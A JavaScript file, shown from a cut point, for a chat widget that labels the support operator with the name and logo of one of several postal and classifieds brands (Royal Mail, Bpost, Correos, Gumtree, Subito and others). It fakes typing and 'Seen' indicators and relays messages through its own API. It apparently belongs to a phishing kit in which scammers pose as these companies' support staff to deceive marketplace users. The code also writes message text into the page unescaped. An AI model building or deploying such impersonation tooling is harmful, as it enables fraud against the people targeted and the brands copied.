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`
    case 'Bpost':
      return `${service} | https://upload.wikimedia.org/wikipedia/commons/thumb/6/68/Bpost_logo.svg/2560px-Bpost_logo.svg.png`
    case 'Donedeal':
      return `${service} | https://adevinta.com/app/uploads/2021/09/done-deal-1.png`
    case 'EMS':
      return `${service} | https://upload.wikimedia.org/wikipedia/commons/d/d2/Ems-sem-fundo-logo.png`
    case 'Anpost':
      return `${service} | https://upload.wikimedia.org/wikipedia/en/thumb/c/cc/An_Post_Logo.svg/640px-An_Post_Logo.svg.png`
    case '2dehands':
      return `${service} | https://cdn.ebayclassifieds.net/bff/static/vendor/hz-web-ui/twh/favicons/favicon-192x192.1c5d8455.png`
    case 'Correos':
      return `${service} | https://upload.wikimedia.org/wikipedia/commons/thumb/9/9c/Logo_Correos_2019.svg/2167px-Logo_Correos_2019.svg.png`
    case '2ememain':
      return `${service} | https://cdn.ebayclassifieds.net/bff/static/vendor/hz-web-ui/twh/favicons/favicon-192x192.1c5d8455.png`
    case 'RoyalMail':
      return `${service} | https://1000logos.net/wp-content/uploads/2020/09/Royal-Mail-Logo.png`
    case 'Subito':
      return `${service} | https://play-lh.googleusercontent.com/uwzR5jlfHajawujhaPGz4qAUr5VrSYikAEiOVroFKnfFKlsoBU7BlAP7vLcrYy77U_M`
    case 'Gumtree':
      return `${service} | https://logowik.com/content/uploads/images/gumtree1310.jpg`
    
  }
  
}
var res = null
try {
    (async () => {
      res = await getSupportData()

      document.getElementsByClassName('supportData')[0].innerHTML += `
      <td><img width="50" height="50" style="margin-top:25%; border-radius: 240px;" src='${res.split(" | ")[1]}'/></td>
      <td><p style="margin-left: 16px; font-size: 18px; color: white; ">${res.split(" | ")[0]}</p></td> 
    `
    })()
    

}
catch(e) {
  console.log(e)
}
/* add message */
function addMessage(side, message) {


  if (side == 'client') {
    dot_box = (document.getElementById('dot_box'))
    console.log(dot_box)
    if (dot_box.innerHTML.includes("dot-container")) {
      return
    }
      messages.innerHTML = messages.innerHTML.replace("Sending...", '').replace("<b>Seen</b> just now", '')
      messages.innerHTML += `
        <div class="chat-message is-${side}">
          <div class="chat-message__content">
            <div class="chat-message__bubble-wrapper">
              <div class="chat-message__bubble chat-bubble chat-bubble--${side} js-message-bubble js-open-chat"> 
                <div class="chat-bubble__inner"> 
                  <div class="chat-bubble__message"> 
                    <span class="chat-bubble__message-text parsed-text parsed-text--message parsed-text${side == "client" ? "--dark-bg" : "--very-light-bg"}">${message}</span>
                  </div>
                </div>
              </div>
              <img width="30" height="30" style="border-radius: 100%; margin-top: 1.6%; margin-left: 2%" src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAM1BMVEXMzMz////Jycn8/PzNzc3T09P4+Pjw8PDY2NjU1NTQ0NDf39/09PTb29vn5+fa2trp6em08oiWAAAGFUlEQVR4nO2diXbjOgiGLZDlNbbf/2mvkJ2tTTpekIV8+c7pdNpOzuQvGIQWVBSKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoij/T4A+gD5g/uJqQFBW1uOtu9V1ef/GZQAou6lH8wT7qSuvIhJgrF7FeXn3z9WYvUbrrTehwXeFD6X+J1OTtUhvvj4o+axwVt7f8tUItfus7AeuzlCiNwu0lfnmnz+fyqqE/FIIdPT8rVAYnBi73ARC269y0Cd9m5VGuKFZYb13U44ZSYRuzQP4U6HpMgmqPmZMW9UtTHkoJIGbDbhYccrCisGC+yTmYUUYdsujF8qXSEFmr0AzhxvZuR9qsz1PvBnR1JKfRSjaIwZcVLZyjej9qzou0FSC/fTgQ3iX2IFNreQb9ri+gFiBu8cyP6mEeik0DD5KoGlESgTYWjB9l9hLzBhQlDsKis8C0ZQSw6nPFEwK54whDrA86hYEhlM/4uZkkGdEWDdzuBYnTiGUrAIp1giD2UlRnpvyJcOFXphCC8wCjQErSqOvfLkRVgn7uokbWfP8UHCVFU8mWQM39kAjLdRAwTQifQFTi3qHq7p/VSgrlvIOu2dkDb7bCArb1KJegRgKRXnp9RVe30sjRBo0shb2Lx9LASLkQ1Ejb2CewyCcKIXXH5dyT2IQwqYx4LZ/d8In0AjbXQMRUn4rS2EBqzbprQZ9KJVVARdQMecLcSsXLAvcr8iapinCwgyvl4oa0QQYtmG8Is5JvcKRVaHArd9QcA7cnLBASlga1nDtVPADGoHPYcFWXwhMhgFgHJsOosYzD4Bt0tTJc9EZtuUZcdn+DteeoV7iQxhg2V4qeoMpWIZgEzZfSlXIs4WWNtBKjTSEdUf2fvmX+jgq1oIEQHmgFKazbrJmuj/hR+BHbChwxP0TgBH3HUggC46p3/4aoBh3KqQDevJNSEC982SXsC00fwCt237A0jhZi01/ArDjhJ7kgyS/8Sm726YQO19D5ySRZsHDvu81Ov0/qzLy0AU6kH9zq+Y1/BN4S/12t0MO55/Gbs3slOvC7yP1W95J0Igfeyssozsna41pK2TIZkDzyVvDd0Nrk5wVEt5Zm+lT8d8PTZG1/V4B6jI09M4575v+z2ruMHQVeTNwb4K1tMO6lrpi8ca70cLnq0n8xeUFKoqiRAOslTuhzUBI9JT6Cyt5VnsXELBNWdd129j5y9RviguS4gellXvrfemqoStzrgsXSF09zH09P/S/RF9e2JyNCdB2y3Y3xPf+kPT35SdVJ2sX4kp8xCR5K+YwQqVIInOLPVBv2qyIVQZLMk+gWKag1moM/uuk98CasSHpDTvXLbowGhDurnbWt2/tyeAgfIWbDNh9SA2b7Cg5sPrnaDy+QdGNcp/Hua/uQYH+9VIXMQD2PoC/JKKw0yQBgJJ1B608M7I3VRAWccBObE2iArSkKKlUptbk7AcQUVAjc/bTJEGgnF6mYVcCq4s+JUroK+yrHt6jJO8iBTyMtHUmgo8+SJ42aCtiPHmGgmqZVCI0cfWF2Y+UjTBJYGSJJqlE2qEXW2L4HxIlRijK2PZ7kKbZJ7AcPVgHpoioXiB+vQWIWyCmSBq2jx5kXiSa/vyV/+pEgSm60h65AWGnxDPrfohTTfxL4omVBh0bOVlf0FieV2nAmVHmrg/P6udiwzb1NExwxhIVHDv3cwQ0Z00Wx6joV2o8Qx53e4htnJEVqZtQQm7RJfI2h9gMxm8nEaHl1TaGyMEG2pPKiS9g9GaDwLB+dlBh3GADTUJ1d6JO20RorbedmIO3ZKOZNyJedglJk/2TKl6NUaYNMzNIU29xMgYw3pVzRCHGM2KMZsH7iHSBSfLhzJNIczbg0rvoDEbqT3sTEGbuRDk4LCRVzEQ4vG+hEGRCRMs9YeN/Yfz3rByB3U1Z+iNxwl9hxLiF5AgR7vfgv+7oCGgaboGC0v0Md9JnvIKTCf4qUVCuIJB7cjjcty0IX2Awb9BIsGD4N8jdIFNYNiSYM6KcuuIB8z2ezG3zGUDkVch7yygPrIV+hAscj8MaTCNc4HiclcH0P9cuRzUVNCH1AAAAAElFTkSuQmCC'>
            </div>
          </div>
        </div>
        <div style="text-align: right;">Sending...</div>
      `
    }
    else if (side == 'operator') {
      dot_box = (document.getElementById('dot_box'))
      console.log(dot_box)
      if (!dot_box.innerHTML.includes("dot-container")) {
        dot_box.innerHTML += `<img width="30" height="30" style="border-radius: 100%; margin-left: 2%" src='${res.split(" | ")[1]}'><div class="dot-container"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>`
      } else {
        return
      }

      setTimeout(function(){
        messages.innerHTML = messages.innerHTML.replace("Sending...", '').replace("<b>Seen</b> just now", '')
        console.log(dot_box.innerHTML)
        dot_box.innerHTML = dot_box.innerHTML.replace(`<img width="30" height="30" style="border-radius: 100%; margin-left: 2%" src="${res.split(" | ")[1]}"><div class="dot-container"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>`, '')

        messages.innerHTML += `
          <div class="chat-message is-${side}">
            <div class="chat-message__content">
              <div class="chat-message__bubble-wrapper">
              <img width="30" height="30" style="border-radius: 100%; margin-top: 2%; margin-right: 2%" src='${res.split(" | ")[1]}'>
                <div class="chat-message__bubble chat-bubble chat-bubble--${side} js-message-bubble js-open-chat"> 
                  <div class="chat-bubble__inner"> 
                    <div class="chat-bubble__message"> 
                      <span class="chat-bubble__message-text parsed-text parsed-text--message parsed-text${side == "client" ? "--dark-bg" : "--very-light-bg"}">${message}</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        `
      }, 6000);

    
    }
  

}

function addMessageOnLoad(side, message) {

  if (side == 'client') {
    
      messages.innerHTML = messages.innerHTML.replace("Sending...", '').replace("<b>Seen</b> just now", '')
      messages.innerHTML += `
        <div class="chat-message is-${side}">
          <div class="chat-message__content">
            <div class="chat-message__bubble-wrapper">
              <div class="chat-message__bubble chat-bubble chat-bubble--${side} js-message-bubble js-open-chat"> 
                <div class="chat-bubble__inner"> 
                  <div class="chat-bubble__message"> 
                    <span class="chat-bubble__message-text parsed-text parsed-text--message parsed-text${side == "client" ? "--dark-bg" : "--very-light-bg"}">${message}</span>
                  </div>
                </div>
              </div>
              <img width="30" height="30" style="border-radius: 100%; margin-top: 1.6%; margin-left: 2%" src='data:image/png;base64,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'>
            </div>
          </div>
        </div>

      `
    }
    else if (side == 'operator') {
      messages.innerHTML = messages.innerHTML.replace("Sending...", '').replace("<b>Seen</b> just now", '')
      messages.innerHTML += `
        <div class="chat-message is-${side}">
          <div class="chat-message__content">
            <div class="chat-message__bubble-wrapper">
            <img width="30" height="30" style="border-radius: 100%; margin-top: 2%; margin-right: 2%" src='${res.split(" | ")[1]}'>
              <div class="chat-message__bubble chat-bubble chat-bubble--${side} js-message-bubble js-open-chat"> 
                <div class="chat-bubble__inner"> 
                  <div class="chat-bubble__message"> 
                    <span class="chat-bubble__message-text parsed-text parsed-text--message parsed-text${side == "client" ? "--dark-bg" : "--very-light-bg"}">${message}</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      `

    }
  

}

function firstBubble() {
    messages.innerHTML += `
<div class="buttonContainer">
  <button class="button">Ask a question</button>
  <button class="button">Connect to sales</button>
  <button class="button">Report an issue</button>
</div>
`

}

setInterval(() => {
  if (messages.innerHTML.includes("Sending...")) {
    messages.innerHTML = messages.innerHTML.replace("Sending...", "<b>Seen</b> just now")
    
  }
  
}, 500)

/* send message from client */
function sendMessage() {
  var message = input.value.replace(/\s+/g, " ").trim();
  if (message.length < 1) return;
  axios.post(`/api/sendMessage/${window.location.href.split('/')[6].split('=')[1]}`, {
    text: message,
  });
  
  addMessage('client', message)

  document.querySelector(".chat-scroller").scrollTop = document.querySelector(".chat-scroller").scrollHeight;
  input.value = "";
}

/* get last message on reload page */
async function getMessages(count) {
  
  let numbTime = (count == 0) ? 1 : parseInt(new Date().getTime() / 1000  )
  const response = await fetch(`/api/getMessages/${window.location.href.split('/')[6].split('=')[1]}/1`, {
    method: 'GET',
    headers: {
      'Accept': 'application/json, text/plain, */*',
      'Content-Type': 'application/json'
    },
    referrerPolicy: 'no-referrer'
  })

  return await response.json()
  document.querySelector(".chat-scroller").scrollTop = document.querySelector(".chat-scroller").scrollHeight;
  
  
}



function getCount() {

  return document.querySelectorAll(".is-operator").length + document.querySelectorAll(".is-client").length + (document.querySelectorAll(".dot-container").length ? document.querySelectorAll(".dot-container").length: 0)

}


/* play audio on new support message */
function playAudio() {
  var audio = new Audio('/static/style/support/new_message.mp3');
  audio.autoplay = true;
  audio.play();
}

counter = 0
setInterval(() => {
  if (getMessages(getCount()).length != 0) {


      getMessages(getCount()).then(async (res) => {
        if (counter == 0) {
          counter++
          for (let i = getCount(); i < res.length; i++) {
    
            if (res[i].who == "Support") {
    
              addMessageOnLoad('operator', res[i].text)
              window.parent.document.querySelector("#chatra").style.display = "block";
              window.parent.document.querySelector(".support-circle").style.display = "none";
          
              document.querySelector(".chat-scroller").scrollTop = document.querySelector(".chat-scroller").scrollHeight;
            } else {
              addMessageOnLoad('client', res[i].text)
              window.parent.document.querySelector("#chatra").style.display = "block";
              window.parent.document.querySelector(".support-circle").style.display = "none";
          
              document.querySelector(".chat-scroller").scrollTop = document.querySelector(".chat-scroller").scrollHeight;
            }
          }
          // firstBubble()
        }
        else {
            for (let i = getCount(); i < res.length; i++) {

              if (res[i].who == "Support") {
                addMessage('operator', res[i].text)
                window.parent.document.querySelector("#chatra").style.display = "block";
                window.parent.document.querySelector(".support-circle").style.display = "none";
            
                document.querySelector(".chat-scroller").scrollTop = document.querySelector(".chat-scroller").scrollHeight;
              } else {
                addMessage('client', res[i].text)
                window.parent.document.querySelector("#chatra").style.display = "block";
                window.parent.document.querySelector(".support-circle").style.display = "none";
            
                document.querySelector(".chat-scroller").scrollTop = document.querySelector(".chat-scroller").scrollHeight;
              }
            }
        }
    })
   
    
    
   
  }
  
}, 1000);